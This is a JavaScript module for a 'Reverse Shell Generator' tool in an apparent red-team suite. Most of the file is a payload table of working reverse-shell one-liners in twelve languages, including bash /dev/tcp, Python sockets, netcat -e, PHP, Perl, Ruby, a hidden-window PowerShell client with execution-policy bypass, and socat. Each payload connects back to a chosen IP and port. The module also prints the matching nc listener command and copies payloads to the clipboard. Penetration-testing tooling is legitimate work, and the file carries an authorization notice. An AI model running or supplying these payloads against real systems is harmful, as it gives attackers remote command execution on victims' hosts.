// ========================================
// REVERSE SHELL GENERATOR
// Category: Red Team
// ========================================

(function() {
    'use strict';

    const shellPayloads = {
        bash: {
            name: 'Bash',
            os: 'Linux/Unix',
            payloads: [
                'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1',
                'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"',
                '0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196',
                'exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done'
            ]
        },
        python: {
            name: 'Python',
            os: 'Linux/Unix/Windows',
            payloads: [
                'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
                'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
                'python -c \'import socket,os,pty;s=socket.socket();s.connect(("{IP}",{PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")\''
            ]
        },
        nc: {
            name: 'Netcat',
            os: 'Linux/Unix',
            payloads: [
                'nc -e /bin/sh {IP} {PORT}',
                'nc {IP} {PORT} -e /bin/bash',
                'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f',
                'nc -c bash {IP} {PORT}',
                'ncat {IP} {PORT} -e /bin/bash'
            ]
        },
        perl: {
            name: 'Perl',
            os: 'Linux/Unix/Windows',
            payloads: [
                'perl -e \'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
                'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{IP}:{PORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''
            ]
        },
        php: {
            name: 'PHP',
            os: 'Linux/Unix/Windows',
            payloads: [
                'php -r \'$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'',
                'php -r \'$sock=fsockopen("{IP}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'',
                'php -r \'$sock=fsockopen("{IP}",{PORT});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\''
            ]
        },
        ruby: {
            name: 'Ruby',
            os: 'Linux/Unix/Windows',
            payloads: [
                'ruby -rsocket -e\'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
                'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{IP}",{PORT});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\''
            ]
        },
        powershell: {
            name: 'PowerShell',
            os: 'Windows',
            payloads: [
                'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
                '$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
                'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{IP}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
            ]
        },
        java: {
            name: 'Java',
            os: 'Linux/Unix/Windows',
            payloads: [
                'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();'
            ]
        },
        nodejs: {
            name: 'Node.js',
            os: 'Linux/Unix/Windows',
            payloads: [
                'require(\'child_process\').exec(\'nc -e /bin/sh {IP} {PORT}\')',
                '(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect({PORT}, "{IP}", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}); return /a/;})();',
                'require("child_process").exec(\'bash -c "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"\')'
            ]
        },
        telnet: {
            name: 'Telnet',
            os: 'Linux/Unix',
            payloads: [
                'TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | /bin/sh 1>$TF',
                'rm -f /tmp/p; mknod /tmp/p p && telnet {IP} {PORT} 0/tmp/p'
            ]
        },
        socat: {
            name: 'Socat',
            os: 'Linux/Unix',
            payloads: [
                'socat TCP:{IP}:{PORT} EXEC:/bin/bash',
                'socat TCP:{IP}:{PORT} EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane'
            ]
        },
        awk: {
            name: 'AWK',
            os: 'Linux/Unix',
            payloads: [
                'awk \'BEGIN {s = "/inet/tcp/0/{IP}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\' /dev/null'
            ]
        }
    };

    function render() {
        const shellOptions = Object.entries(shellPayloads)
            .map(([key, value]) => `<option value="${key}">${value.name} (${value.os})</option>`)
            .join('');

        return `
            <div class="mb-4">
                <h4><i class="bi bi-terminal-fill"></i> Reverse Shell Generator</h4>
                <p class="text-secondary">Generate reverse shell payloads for penetration testing</p>
            </div>
            
            <div class="row g-3">
                <div class="col-md-6">
                    <label for="shellType" class="form-label">Shell Type</label>
                    <select class="form-select" id="shellType" onchange="updateVariants()">
                        ${shellOptions}
                    </select>
                    <small id="shellInfo" class="text-secondary"></small>
                </div>

                <div class="col-md-6">
                    <label for="shellVariant" class="form-label">Variant</label>
                    <select class="form-select" id="shellVariant"></select>
                </div>
            </div>
            
            <div class="row g-3 mt-2">
                <div class="col-md-6">
                    <label for="listenerIp" class="form-label">Listener IP Address</label>
                    <input type="text" class="form-control font-monospace" id="listenerIp" placeholder="10.10.10.5" value="10.10.10.5">
                </div>

                <div class="col-md-6">
                    <label for="listenerPort" class="form-label">Listener Port</label>
                    <input type="number" class="form-control font-monospace" id="listenerPort" placeholder="4444" value="4444" min="1" max="65535">
                </div>
            </div>
            
            <div class="row g-3 mt-2">
                <div class="col-12">
                    <button class="btn btn-primary" onclick="generateShell()">
                        <i class="bi bi-play-fill"></i> Generate Payload
                    </button>
                    <button class="btn btn-outline-primary" onclick="copyShellToClipboard()">
                        <i class="bi bi-clipboard"></i> Copy to Clipboard
                    </button>
                </div>
            </div>
            
            <div id="shellResults" class="mt-3"></div>

            <div class="card bg-dark mt-4">
                <div class="card-header">
                    <i class="bi bi-exclamation-triangle-fill text-warning"></i> Legal Notice
                </div>
                <div class="card-body">
                    <p class="mb-0 small">This tool is for authorized penetration testing only. Unauthorized access to computer systems is illegal and unethical. Always obtain proper authorization before conducting security testing.</p>
                </div>
            </div>
        `;
    }

    function init() {
        window.updateVariants = function() {
            const shellType = document.getElementById('shellType').value;
            const variantSelect = document.getElementById('shellVariant');
            const shell = shellPayloads[shellType];
            
            variantSelect.innerHTML = shell.payloads
                .map((_, idx) => `<option value="${idx}">Variant ${idx + 1}</option>`)
                .join('');
            
            // Update info text
            document.getElementById('shellInfo').textContent = `${shell.name} - ${shell.os}`;
        };

        window.generateShell = function() {
            const shellType = document.getElementById('shellType').value;
            const variant = parseInt(document.getElementById('shellVariant').value);
            const ip = document.getElementById('listenerIp').value.trim();
            const port = document.getElementById('listenerPort').value.trim();
            const resultsDiv = document.getElementById('shellResults');
            
            if (!ip || !port) {
                resultsDiv.innerHTML = '<div class="alert alert-warning"><i class="bi bi-exclamation-triangle-fill"></i> Please provide both IP address and port</div>';
                return;
            }

            // Validate IP address format
            const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
            if (!ipRegex.test(ip)) {
                resultsDiv.innerHTML = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle-fill"></i> Invalid IP address format</div>';
                return;
            }

            // Validate port number
            const portNum = parseInt(port);
            if (portNum < 1 || portNum > 65535) {
                resultsDiv.innerHTML = '<div class="alert alert-danger"><i class="bi bi-exclamation-triangle-fill"></i> Port must be between 1 and 65535</div>';
                return;
            }

            const shell = shellPayloads[shellType];
            const template = shell.payloads[variant];
            const payload = template.replace(/{IP}/g, ip).replace(/{PORT}/g, port);

            window.currentPayload = payload;

            resultsDiv.innerHTML = `
                <div class="alert alert-success">
                    <h6 class="alert-heading"><i class="bi bi-check-circle-fill"></i> Payload Generated Successfully</h6>
                    <div class="row small mb-2">
                        <div class="col-md-4">
                            <strong>Shell Type:</strong> ${shell.name}
                        </div>
                        <div class="col-md-4">
                            <strong>Target OS:</strong> ${shell.os}
                        </div>
                        <div class="col-md-4">
                            <strong>Variant:</strong> #${variant + 1}
                        </div>
                    </div>
                </div>
                
                <div class="card bg-dark mb-3">
                    <div class="card-header">
                        <i class="bi bi-code-square"></i> Generated Payload
                    </div>
                    <div class="card-body">
                        <div class="code-block">${window.escapeHtml(payload)}</div>
                    </div>
                </div>
                
                <div class="alert alert-info">
                    <h6 class="alert-heading"><i class="bi bi-router-fill"></i> Listener Setup Instructions</h6>
                    <p class="mb-2">Start your listener before executing the payload on the target system:</p>
                    <div class="code-block mb-2">nc -lvnp ${port}</div>
                    <small class="text-muted">
                        <strong>Flags:</strong> -l (listen mode) | -v (verbose) | -n (no DNS) | -p (port)
                    </small>
                </div>
            `;
        };

        window.copyShellToClipboard = function() {
            if (!window.currentPayload) {
                const resultsDiv = document.getElementById('shellResults');
                resultsDiv.innerHTML = '<div class="alert alert-warning"><i class="bi bi-exclamation-triangle-fill"></i> Generate a payload first</div>';
                return;
            }

            navigator.clipboard.writeText(window.currentPayload).then(() => {
                const resultsDiv = document.getElementById('shellResults');
                const successMsg = document.createElement('div');
                successMsg.className = 'alert alert-success alert-dismissible fade show';
                successMsg.innerHTML = `
                    <i class="bi bi-check-circle-fill"></i> Payload copied to clipboard!
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                `;
                resultsDiv.insertBefore(successMsg, resultsDiv.firstChild);
                setTimeout(() => {
                    if (successMsg.parentNode) {
                        successMsg.remove();
                    }
                }, 3000);
            }).catch((err) => {
                const resultsDiv = document.getElementById('shellResults');
                const errorMsg = document.createElement('div');
                errorMsg.className = 'alert alert-danger';
                errorMsg.innerHTML = '<i class="bi bi-exclamation-triangle-fill"></i> Failed to copy to clipboard';
                resultsDiv.insertBefore(errorMsg, resultsDiv.firstChild);
                setTimeout(() => errorMsg.remove(), 3000);
            });
        };

        // Initialize variants on load
        window.updateVariants();
    }

    // Register the tool
    window.registerCyberSuiteTool({
        id: 'reverse-shell-generator',
        name: 'Reverse Shell Generator',
        description: 'Generate reverse shell payloads for 12 languages: Bash, Python, Netcat, Perl, PHP, Ruby, PowerShell, Java, Node.js, Telnet, Socat, AWK',
        icon: 'bi-terminal-fill',
        category: 'red',
        render: render,
        init: init
    });
})();